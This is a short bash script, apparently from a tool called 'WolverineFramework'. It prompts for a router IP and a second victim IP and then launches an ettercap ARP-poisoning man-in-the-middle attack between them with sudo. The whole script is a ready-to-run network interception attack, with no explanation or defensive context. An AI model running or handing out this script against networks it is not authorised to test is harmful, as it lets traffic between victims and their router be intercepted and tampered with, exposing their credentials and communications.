#!/bin/bash
echo "Enter the IP address of your target 1 (Router)"
read -p "WolverineFramework - IP (Target 1)> " varIP1
echo "Enter the IP address of your target 2 (Someone)"
read -p "WolverineFramework - IP (Target 2)> " varIP2
echo "Launching attack..."
sudo ettercap -T -S -M arp:remote /$varIP1// /$varIP2//
